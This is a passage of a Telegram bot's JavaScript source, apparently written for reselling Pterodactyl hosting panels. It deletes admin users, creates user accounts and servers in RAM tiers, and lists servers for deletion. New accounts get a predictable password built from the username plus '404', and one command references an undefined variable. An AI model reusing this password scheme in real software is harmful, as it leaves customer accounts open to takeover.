⚠️ <i>Hati-hati, tindakan ini tidak dapat dibatalkan!</i>
────────────────────────────
© AldzyIsHere`,
            {
                parse_mode: "HTML",
                reply_markup: { inline_keyboard: buttons }
            }
        );
    } catch (err) {
        console.error(err);
        ctx.reply("❌ Terjadi kesalahan saat mengambil data admin panel V3.");
    }
});

// -------------------- [ Command : DelAdmin Panel V4 ] --------------------
bot.command("deladminpV4", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

    // Cek limit
    const commandName = "deladminpV4";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const { domain: serverDomain, apikey: serverApikey } = getServerConfig("V4");

    try {
        const res = await fetch(`${serverDomain}/api/application/users`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${serverApikey}`
            }
        });

        const data = await res.json();
        const users = data.data;
        const adminUsers = users.filter(u => u.attributes.root_admin === true);

        if (adminUsers.length < 1) return ctx.reply("⚠️ Tidak ada admin panel di V4.");

        const buttons = adminUsers.map((admin) => [
            { text: `🧩 ${admin.attributes.first_name} | ID:${admin.attributes.id}`, callback_data: `DELADMIN:${admin.attributes.id}:V4` }
        ]);

        await ctx.reply(
            `<b>(🧩) Pilih admin panel V4 yang ingin dihapus</b>

📊 <b>Total Admin Panel:</b> ${adminUsers.length}
⚠️ <i>Hati-hati, tindakan ini tidak dapat dibatalkan!</i>
────────────────────────────
© AldzyIsHere`,
            {
                parse_mode: "HTML",
                reply_markup: { inline_keyboard: buttons }
            }
        );
    } catch (err) {
        console.error(err);
        ctx.reply("❌ Terjadi kesalahan saat mengambil data admin panel V4.");
    }
});

// -------------------- [ Command : DelAdmin Panel V5 ] --------------------
bot.command("deladminpV5", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

    // Cek limit
    const commandName = "deladminpV5";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const { domain: serverDomain, apikey: serverApikey } = getServerConfig("V5");

    try {
        const res = await fetch(`${serverDomain}/api/application/users`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${serverApikey}`
            }
        });

        const data = await res.json();
        const users = data.data;
        const adminUsers = users.filter(u => u.attributes.root_admin === true);

        if (adminUsers.length < 1) return ctx.reply("⚠️ Tidak ada admin panel di V5.");

        const buttons = adminUsers.map((admin) => [
            { text: `🧩 ${admin.attributes.first_name} | ID:${admin.attributes.id}`, callback_data: `DELADMIN:${admin.attributes.id}:V5` }
        ]);

        await ctx.reply(
            `<b>(🧩) Pilih admin panel V5 yang ingin dihapus</b>

📊 <b>Total Admin Panel:</b> ${adminUsers.length}
⚠️ <i>Hati-hati, tindakan ini tidak dapat dibatalkan!</i>
────────────────────────────
© AldzyIsHere`,
            {
                parse_mode: "HTML",
                reply_markup: { inline_keyboard: buttons }
            }
        );
    } catch (err) {
        console.error(err);
        ctx.reply("❌ Terjadi kesalahan saat mengambil data admin panel V5.");
    }
});

// -------------------- [ Action : Delete Admin Panel ] --------------------
bot.action(/^DELADMIN:(.+):(.+)$/, async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.answerCbQuery("🚫 Tidak memiliki akses.");

    const id = ctx.match[1];
    const server = ctx.match[2];

    // Cek limit
    const commandName = `deladminp${server}`;
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) {
        ctx.answerCbQuery("❌ Limit telah habis!");
        return;
    }

    const { domain: serverDomain, apikey: serverApikey } = getServerConfig(server);

    try {
        await fetch(`${serverDomain}/api/application/users/${id}`, {
            method: "DELETE",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${serverApikey}`
            }
        });

        await ctx.editMessageText(`🗑️ Admin panel dengan ID <b>${id}</b> di server <b>${server}</b> berhasil dihapus!`, { parse_mode: "HTML" });
        ctx.answerCbQuery(`✅ Admin panel di server ${server} berhasil dihapus!`);
    } catch (err) {
        console.error(err);
        ctx.answerCbQuery("❌ Gagal menghapus admin panel.");
    }
});

// -------------------- [ Command : Cpanel V1 ] --------------------
bot.command("cpanel", async (ctx) => {
    const username = ctx.from.username || ctx.from.first_name || 'User';
    const userId = ctx.from.id.toString();
    const chatType = ctx.chat.type;

    if (isGroupOnly() && chatType === 'private') {
        return ctx.reply('❌ This bot can only be used in groups.');
    }

    // Cek Prem
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;

    // Cek limit 
    const commandName = "cpanel";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const text = ctx.message.text.split(" ").slice(1).join(" ");
    if (!text) {
        return ctx.reply("❌ Contoh : /cpanel username,12345678");
    }

    const parts = text.split(",");
    if (parts.length < 2) {
        return ctx.reply("❌ Contoh : /cpanel username,12345678");
    }

    const [usernem, IDRaw] = parts.map(t => t.trim());
    const targetID = IDRaw.replace(/[^0-9]/g, "");
    const name = capital(usernem) + " Server";

    const inlineKeyboard = [
        [
            { text: "💾 1 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:1gb:V1:${userId}` },
            { text: "💾 2 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:2gb:V1:${userId}` },
            { text: "💾 3 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:3gb:V1:${userId}` }
        ],
        [
            { text: "💾 4 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:4gb:V1:${userId}` },
            { text: "💾 5 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:5gb:V1:${userId}` },
            { text: "💾 6 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:6gb:V1:${userId}` }
        ],
        [
            { text: "💾 7 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:7gb:V1:${userId}` },
            { text: "💾 8 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:8gb:V1:${userId}` },
            { text: "💾 9 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:9gb:V1:${userId}` }
        ],
        [
            { text: "✨ Unlimited", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:unlimited:V1:${userId}` }
        ]
    ];

    await ctx.replyWithPhoto(Cukimay(), {
        caption: `<b>(🧩) ${username}</b>, silakan pilih <b>RAM server</b> untuk:
<b>${name}</b>

👤 <b>Username:</b> ${usernem}
🆔 <b>Target ID:</b> <code>${targetID}</code>
🔧 <b>Server:</b> V1
───────────────────────
© AldzyIsHere`,
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: inlineKeyboard }
    });
});

// -------------------- [ Command : Cpanel V2 ] --------------------
bot.command("cpanelV2", async (ctx) => {
    const username = ctx.from.username || ctx.from.first_name || 'User';
    const userId = ctx.from.id.toString();
    const chatType = ctx.chat.type;

    if (isGroupOnly() && chatType === 'private') {
        return ctx.reply('❌ This bot can only be used in groups.');
    }

    // Cek prem
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;

    // Cek cooldown
    const cooldownAllowed = await checkCommandCooldownWrapper(ctx, "cpanelV2");
    if (!cooldownAllowed) return;

    // Cek limit 
    const commandName = "cpanelV2";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const text = ctx.message.text.split(" ").slice(1).join(" ");
    if (!text) {
        return ctx.reply("❌ Contoh : /cpanelV2 username,12345678");
    }

    const parts = text.split(",");
    if (parts.length < 2) {
        return ctx.reply("❌ Contoh : /cpanelV2 username,12345678");
    }

    const [usernem, IDRaw] = parts.map(t => t.trim());
    const targetID = IDRaw.replace(/[^0-9]/g, "");
    const name = capital(usernem) + " Server";

    const inlineKeyboard = [
        [
            { text: "💾 1 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:1gb:V2:${userId}` },
            { text: "💾 2 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:2gb:V2:${userId}` },
            { text: "💾 3 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:3gb:V2:${userId}` }
        ],
        [
            { text: "💾 4 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:4gb:V2:${userId}` },
            { text: "💾 5 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:5gb:V2:${userId}` },
            { text: "💾 6 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:6gb:V2:${userId}` }
        ],
        [
            { text: "💾 7 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:7gb:V2:${userId}` },
            { text: "💾 8 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:8gb:V2:${userId}` },
            { text: "💾 9 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:9gb:V2:${userId}` }
        ],
        [
            { text: "✨ Unlimited", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:unlimited:V2:${userId}` }
        ]
    ];

    await ctx.replyWithPhoto(Cukimay(), {
        caption: `<b>(🧩) ${username}</b>, silakan pilih <b>RAM server</b> untuk:
<b>${name}</b>

👤 <b>Username:</b> ${usernem}
🆔 <b>Target ID:</b> <code>${targetID}</code>
🔧 <b>Server:</b> V2
───────────────────────
© AldzyIsHere`,
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: inlineKeyboard }
    });
});

// -------------------- [ Command : Cpanel V3 ] --------------------
bot.command("cpanelV3", async (ctx) => {
    const username = ctx.from.username || ctx.from.first_name || 'User';
    const userId = ctx.from.id.toString();
    const chatType = ctx.chat.type;

    if (isGroupOnly() && chatType === 'private') {
        return ctx.reply('❌ This bot can only be used in groups.');
    }

    // Cek prem
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;

    // Cek limit
    const commandName = "cpanelV3";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const text = ctx.message.text.split(" ").slice(1).join(" ");
    if (!text) {
        return ctx.reply("❌ Contoh : /cpanelV3 username,12345678");
    }

    const parts = text.split(",");
    if (parts.length < 2) {
        return ctx.reply("❌ Contoh : /cpanelV3 username,12345678");
    }

    const [usernem, IDRaw] = parts.map(t => t.trim());
    const targetID = IDRaw.replace(/[^0-9]/g, "");
    const name = capital(usernem) + " Server";

    const inlineKeyboard = [
        [
            { text: "💾 1 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:1gb:V3:${userId}` },
            { text: "💾 2 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:2gb:V3:${userId}` },
            { text: "💾 3 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:3gb:V3:${userId}` }
        ],
        [
            { text: "💾 4 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:4gb:V3:${userId}` },
            { text: "💾 5 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:5gb:V3:${userId}` },
            { text: "💾 6 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:6gb:V3:${userId}` }
        ],
        [
            { text: "💾 7 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:7gb:V3:${userId}` },
            { text: "💾 8 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:8gb:V3:${userId}` },
            { text: "💾 9 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:9gb:V3:${userId}` }
        ],
        [
            { text: "✨ Unlimited", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:unlimited:V3:${userId}` }
        ]
    ];

    await ctx.replyWithPhoto(Cukimay(), {
        caption: `<b>(🧩) ${username}</b>, silakan pilih <b>RAM server</b> untuk:
<b>${name}</b>

👤 <b>Username:</b> ${usernem}
🆔 <b>Target ID:</b> <code>${targetID}</code>
🔧 <b>Server:</b> V3
───────────────────────
© AldzyIsHere`,
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: inlineKeyboard }
    });
});

// -------------------- [ Command : Cpanel V4 ] --------------------
bot.command("cpanelV4", async (ctx) => {
    const username = ctx.from.username || ctx.from.first_name || 'User';
    const userId = ctx.from.id.toString();
    const chatType = ctx.chat.type;

    if (isGroupOnly() && chatType === 'private') {
        return ctx.reply('❌ This bot can only be used in groups.');
    }

    // Cek prem
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;

    // Cek limit
    const commandName = "cpanelV4";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const text = ctx.message.text.split(" ").slice(1).join(" ");
    if (!text) {
        return ctx.reply("❌ Contoh : /cpanelV4 username,12345678");
    }

    const parts = text.split(",");
    if (parts.length < 2) {
        return ctx.reply("❌ Contoh : /cpanelV4 username,12345678");
    }

    const [usernem, IDRaw] = parts.map(t => t.trim());
    const targetID = IDRaw.replace(/[^0-9]/g, "");
    const name = capital(usernem) + " Server";

    const inlineKeyboard = [
        [
            { text: "💾 1 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:1gb:V4:${userId}` },
            { text: "💾 2 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:2gb:V4:${userId}` },
            { text: "💾 3 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:3gb:V4:${userId}` }
        ],
        [
            { text: "💾 4 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:4gb:V4:${userId}` },
            { text: "💾 5 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:5gb:V4:${userId}` },
            { text: "💾 6 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:6gb:V4:${userId}` }
        ],
        [
            { text: "💾 7 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:7gb:V4:${userId}` },
            { text: "💾 8 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:8gb:V4:${userId}` },
            { text: "💾 9 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:9gb:V4:${userId}` }
        ],
        [
            { text: "✨ Unlimited", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:unlimited:V4:${userId}` }
        ]
    ];

    await ctx.replyWithPhoto(Cukimay(), {
        caption: `<b>(🧩) ${username}</b>, silakan pilih <b>RAM server</b> untuk:
<b>${name}</b>

👤 <b>Username:</b> ${usernem}
🆔 <b>Target ID:</b> <code>${targetID}</code>
🔧 <b>Server:</b> V4
───────────────────────
© AldzyIsHere`,
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: inlineKeyboard }
    });
});

// -------------------- [ Command : Cpanel V5 ] --------------------
bot.command("cpanelV5", async (ctx) => {
    const username = ctx.from.username || ctx.from.first_name || 'User';
    const userId = ctx.from.id.toString();
    const chatType = ctx.chat.type;

    if (isGroupOnly() && chatType === 'private') {
        return ctx.reply('❌ This bot can only be used in groups.');
    }

    // Cek prem
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;

    // Cek limit
    const commandName = "cpanelV5";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const text = ctx.message.text.split(" ").slice(1).join(" ");
    if (!text) {
        return ctx.reply("❌ Contoh : /cpanelV5 username,12345678");
    }

    const parts = text.split(",");
    if (parts.length < 2) {
        return ctx.reply("❌ Contoh : /cpanelV5 username,12345678");
    }

    const [usernem, IDRaw] = parts.map(t => t.trim());
    const targetID = IDRaw.replace(/[^0-9]/g, "");
    const name = capital(usernem) + " Server";

    const inlineKeyboard = [
        [
            { text: "💾 1 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:1gb:V5:${userId}` },
            { text: "💾 2 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:2gb:V5:${userId}` },
            { text: "💾 3 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:3gb:V5:${userId}` }
        ],
        [
            { text: "💾 4 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:4gb:V5:${userId}` },
            { text: "💾 5 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:5gb:V5:${userId}` },
            { text: "💾 6 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:6gb:V5:${userId}` }
        ],
        [
            { text: "💾 7 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:7gb:V5:${userId}` },
            { text: "💾 8 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:8gb:V5:${userId}` },
            { text: "💾 9 GB", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:9gb:V5:${userId}` }
        ],
        [
            { text: "✨ Unlimited", callback_data: `CPANEL_CREATE:${usernem}:${targetID}:unlimited:V5:${userId}` }
        ]
    ];

    await ctx.replyWithPhoto(Cukimay(), {
        caption: `<b>(🧩) ${username}</b>, silakan pilih <b>RAM server</b> untuk:
<b>${name}</b>

👤 <b>Username:</b> ${usernem}
🆔 <b>Target ID:</b> <code>${targetID}</code>
🔧 <b>Server:</b> V5
───────────────────────
© AldzyIsHere`,
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: inlineKeyboard }
    });
});

// -------------------- [ Action : Create Panel Based On RAM ] --------------------
bot.action(/^CPANEL_CREATE:(.+):(.+):(.+):(.+):(.+)$/, async (ctx) => {
    const [, usernem, targetID, cmd, server, requesterId] = ctx.match;

    const userId = ctx.from.id.toString();
    if (userId !== requesterId) {
        return ctx.answerCbQuery("❌ Anda tidak memiliki izin untuk menggunakan tombol ini!");
    }

    // Cek limit 
    const commandName = `cpanel${server}`;
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) {
        ctx.answerCbQuery("❌ Limit telah habis!");
        return;
    }

    const resourceMap = {
        "1gb": { ram: "1000", disk: "1000", cpu: "40" },
        "2gb": { ram: "2000", disk: "1000", cpu: "60" },
        "3gb": { ram: "3000", disk: "2000", cpu: "80" },
        "4gb": { ram: "4000", disk: "2000", cpu: "100" },
        "5gb": { ram: "5000", disk: "3000", cpu: "120" },
        "6gb": { ram: "6000", disk: "3000", cpu: "140" },
        "7gb": { ram: "7000", disk: "4000", cpu: "160" },
        "8gb": { ram: "8000", disk: "4000", cpu: "180" },
        "9gb": { ram: "9000", disk: "5000", cpu: "200" },
        "unlimited": { ram: "0", disk: "0", cpu: "0" }
    };

    const { ram, disk, cpu } = resourceMap[cmd];
    const email = `${usernem}@gmail.com`;
    const name = capital(usernem) + " Server";
    const password = `${usernem}404`;

    const { domain: serverDomain, apikey: serverApikey, nestid: serverNestid, egg: serverEgg, loc: serverLoc } = getServerConfig(server);

    await ctx.editMessageMedia({
        type: "photo",
        media: Cukimay(),
        caption: `⏳ Membuat panel <b>${cmd.toUpperCase()}</b> untuk <b>${usernem}</b>...`,
        parse_mode: "HTML"
    });

    try {
        const userRes = await fetch(serverDomain + "/api/application/users", {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + serverApikey
            },
            body: JSON.stringify({
                email,
                username: usernem,
                first_name: name,
                last_name: "Server",
                language: "en",
                password
            })
        });

        const userData = await userRes.json();
        if (userData.errors) {
            const errorMsg = userData.errors[0]?.detail || JSON.stringify(userData.errors[0]);
            return ctx.editMessageCaption(`❌ Gagal membuat user: ${errorMsg}`, { parse_mode: "HTML" });
        }
        const user = userData.attributes;

        const eggRes = await fetch(`${serverDomain}/api/application/nests/${serverNestid}/eggs/${serverEgg}`, {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + serverApikey
            }
        });

        const eggData = await eggRes.json();
        const startup_cmd = eggData.attributes.startup;

        const serverRes = await fetch(serverDomain + "/api/application/servers", {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + serverApikey
            },
            body: JSON.stringify({
                name,
                description: `Created by Vyxxz - ${tanggal(Date.now())}`,
                user: user.id,
                egg: parseInt(serverEgg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_20",
                startup: startup_cmd,
                environment: {
                    INST: "npm",
                    USER_UPLOAD: "0",
                    AUTO_UPDATE: "0",
                    CMD_RUN: "npm start"
                },
                limits: {
                    memory: parseInt(ram),
                    swap: 0,
                    disk: parseInt(disk),
                    io: 500,
                    cpu: parseInt(cpu)
                },
                feature_limits: {
                    databases: 5,
                    backups: 5,
                    allocations: 5
                },
                deploy: {
                    locations: [parseInt(serverLoc)],
                    dedicated_ip: false,
                    port_range: []
                }
            })
        });

        const serverData = await serverRes.json();
        if (serverData.errors) {
            await fetch(`${serverDomain}/api/application/users/${user.id}`, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + serverApikey
                }
            });
            const errorMsg = serverData.errors[0]?.detail || JSON.stringify(serverData.errors[0]);
            return ctx.editMessageCaption(`❌ Gagal membuat server: ${errorMsg}`, { parse_mode: "HTML" });
        }
        const panelServer = serverData.attributes;
        let successSent = false;
        try {
            await ctx.telegram.sendPhoto(
                targetID,
                Photo(),
                {
                    caption:
                        `<b>✅ Berhasil Membuat Panel</b>

👤 <b>Username:</b> <code>${user.username}</code>
🔐 <b>Password:</b> <code>${password}</code>
📧 <b>Email:</b> <code>${email}</code>

<b>Spesifikasi Server:</b>
- <b>RAM:</b> ${ram == "0" ? "Unlimited" : ram / 1000 + " GB"}
- <b>Disk:</b> ${disk == "0" ? "Unlimited" : disk / 1000 + " GB"}
- <b>CPU:</b> ${cpu == "0" ? "Unlimited" : cpu + "%"}
- Panel: ${serverDomain}

<pre>Rules Pembelian Panel:</pre>
- Masa aktif 30 hari  
- Data bersifat pribadi  
- Garansi 15 hari (1x replace)  
- Klaim wajib menyertakan bukti chat pembelian

© AldzyIsHere. `,
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: `🌐 𝖫𝗈𝗀𝗂𝗇 𝖯𝖺𝗇𝖾𝗅`, url: serverDomain }
                            ],
                            [
                                { text: "─ 𝖡𝗎𝗒 𝖲𝖼𝗋𝗂𝗉𝗍", url: `https://t.me/${config.NameOwner?.replace('@', '') || 'ReyValdz'}` },
                                { text: "─ Bots Information", url: "https://t.me/Xtrol_Team" }
                            ],
                            [
                                { text: "─ 𝖦𝗋𝗎𝗉", url: "https://t.me/+xxxxxxxxx" }
                            ]
                        ]
                    }
                }
            );
            successSent = true;
        } catch (error) {
            console.log("Tidak bisa mengirim pesan ke target:", error);
            successSent = false;
        }

        // notif
        if (successSent) {
            await ctx.editMessageMedia({
                type: "photo",
                media: Cukimay(),
                caption: `
<b>✅ BERHASIL MEMBUAT PANEL SERVER</b>

🔧 <b>Server:</b> ${server}
<b>🛠 Spesifikasi Server:</b>
💾 <b>RAM:</b> ${ram == "0" ? "Unlimited" : ram / 1000 + " GB"}
💿 <b>Disk:</b> ${disk == "0" ? "Unlimited" : disk / 1000 + " GB"}
⚡ <b>CPU:</b> ${cpu == "0" ? "Unlimited" : cpu + "%"}

✅ <b>Data login telah dikirim ke private chat target</b>
────────────────────────────
© AldzyIsHere`,
                parse_mode: "HTML"
            }, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "─ Contact Owner", url: `https://t.me/${config.NameOwner?.replace('@', '') || 'ReyValdz'}` }]
                    ]
                }
            });
        } else {
            await ctx.editMessageMedia({
                type: "photo",
                media: Cukimay(),
                caption: `
❌ <b>Gagal mengirim data login ke private chat</b>
⚠️ Pastikan target sudah memulai chat dengan bot`,
                parse_mode: "HTML"
            }, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "─ Contact Owner", url: `https://t.me/${config.NameOwner?.replace('@', '') || 'ReyValdz'}` }]
                    ]
                }
            });
        }

    } catch (err) {
        console.error("Error creating panel:", err);
        await ctx.editMessageMedia({
            type: "photo",
            media: Cukimay(),
            caption: `❌ Gagal membuat panel di server ${server}: ${err.message}`,
            parse_mode: "HTML"
        });
        ctx.answerCbQuery("❌ Gagal membuat panel!");
    }
});

// -------------------- [ Command : DelPanel V1 ] --------------------
bot.command("delpanel", async (ctx) => {
    const username = ctx.from.username || ctx.from.first_name || 'User';
    const chatType = ctx.chat.type;
    const userId = ctx.from.id.toString();

    if (isGroupOnly() && chatType === 'private') {
        return ctx.reply('❌ This bot can only be used in groups.');
    }

    if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

    // Cek limit
    const commandName = "delpanelV1";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const { domain: serverDomain, apikey: serverApikey } = getServerConfig("V1");

    try {
        const response = await fetch(`${serverDomain}/api/application/servers`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${serverApikey}`,
            },
        });

        const result = await response.json();
        const servers = result.data;

        if (!servers || servers.length === 0) {
            return ctx.reply("⚠️ Tidak ada server panel di V1 yang bisa dihapus!");
        }

        const buttons = [
            [{ text: "🗑️ Hapus Semua Server V1", callback_data: "DEL_ALL_PANEL:V1" }]
        ];

        for (const server of servers) {
            const s = server.attributes;
            buttons.push([
                { text: `🧩 ${s.name} | ID:${s.id}`, callback_data: `DEL_PANEL:${s.id}:V1` }
            ]);
        }

        const caption = `<b>( 🦋 ) Olá ${username}</b>
Silakan pilih server V1 yang ingin dihapus 👇

📊 <b>Jumlah Total Server V1:</b> ${servers.length}

⚠️ <i>Gunakan dengan hati-hati, tindakan ini tidak dapat dibatalkan.</i>
────────────────────────────
© AldzyIsHere`;

        await ctx.reply(caption, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: buttons }
        });
    } catch (err) {
        console.error("Error fetching servers:", err);
        ctx.reply("❌ Terjadi kesalahan saat mengambil data server V1.");
    }
});

// -------------------- [ Command : DelPanel V2 ] --------------------
bot.command("delpanelV2", async (ctx) => {
    const username = ctx.from.username || ctx.from.first_name || 'User';
    const chatType = ctx.chat.type;

    if (isGroupOnly() && chatType === 'private') {
        return ctx.reply('❌ This bot can only be used in groups.');
    }

    if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

    // Cek limit
    const commandName = "delpanelV2";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const { domain: serverDomain, apikey: serverApikey } = getServerConfig("V2");

    try {
        const response = await fetch(`${serverDomain}/api/application/servers`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${serverApikey}`,
            },
        });

        const result = await response.json();
        const servers = result.data;

        if (!servers || servers.length === 0) {
            return ctx.reply("⚠️ Tidak ada server panel di V2 yang bisa dihapus!");
        }

        const buttons = [
            [{ text: "🗑️ Hapus Semua Server V2", callback_data: "DEL_ALL_PANEL:V2" }]
        ];

        for (const server of servers) {
            const s = server.attributes;
            buttons.push([
                { text: `🧩 ${s.name} | ID:${s.id}`, callback_data: `DEL_PANEL:${s.id}:V2` }
            ]);
        }

        const caption = `<b>( 🦋 ) Olá ${username}</b>
Silakan pilih server V2 yang ingin dihapus 👇

📊 <b>Jumlah Total Server V2:</b> ${servers.length}

⚠️ <i>Gunakan dengan hati-hati, tindakan ini tidak dapat dibatalkan.</i>
────────────────────────────
© AldzyIsHere`;

        await ctx.reply(caption, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: buttons }
        });
    } catch (err) {
        console.error("Error fetching servers:", err);
        ctx.reply("❌ Terjadi kesalahan saat mengambil data server V2.");
    }
});

// -------------------- [ Command : DelPanel V3 ] --------------------
bot.command("delpanelV3", async (ctx) => {
    const username = ctx.from.username || ctx.from.first_name || 'User';
    const chatType = ctx.chat.type;
    const userId = ctx.from.id.toString();

    if (isGroupOnly() && chatType === 'private') {
        return ctx.reply('❌ This bot can only be used in groups.');
    }

    if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

    // Cek limit
    const commandName = "delpanelV3";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const { domain: serverDomain, apikey: serverApikey } = getServerConfig("V3");

    try {
        const response = await fetch(`${serverDomain}/api/application/servers`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${serverApikey}`,
            },
        });

        const result = await response.json();
        const servers = result.data;

        if (!servers || servers.length === 0) {
            return ctx.reply("⚠️ Tidak ada server panel di V3 yang bisa dihapus!");
        }

        const buttons = [
            [{ text: "🗑️ Hapus Semua Server V3", callback_data: "DEL_ALL_PANEL:V3" }]
        ];

        for (const server of servers) {
            const s = server.attributes;
            buttons.push([
                { text: `🧩 ${s.name} | ID:${s.id}`, callback_data: `DEL_PANEL:${s.id}:V3` }
            ]);
        }

        const caption = `<b>( 🦋 ) Olá ${username}</b>
Silakan pilih server V3 yang ingin dihapus 👇

📊 <b>Jumlah Total Server V3:</b> ${servers.length}

⚠️ <i>Gunakan dengan hati-hati, tindakan ini tidak dapat dibatalkan.</i>
────────────────────────────
© AldzyIsHere`;

        await ctx.reply(caption, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: buttons }
        });
    } catch (err) {
        console.error("Error fetching servers:", err);
        ctx.reply("❌ Terjadi kesalahan saat mengambil data server V3.");
    }
});

// -------------------- [ Command : DelPanel V4 ] --------------------
bot.command("delpanelV4", async (ctx) => {
    const username = ctx.from.username || ctx.from.first_name || 'User';
    const chatType = ctx.chat.type;
    const userId = ctx.from.id.toString();

    if (isGroupOnly() && chatType === 'private') {
        return ctx.reply('❌ This bot can only be used in groups.');
    }

    if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

    // Cek limit
    const commandName = "delpanelV4";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const { domain: serverDomain, apikey: serverApikey } = getServerConfig("V4");

    try {
        const response = await fetch(`${serverDomain}/api/application/servers`, {
            method: "GET",
            headers: {
                Accept: "application/json",
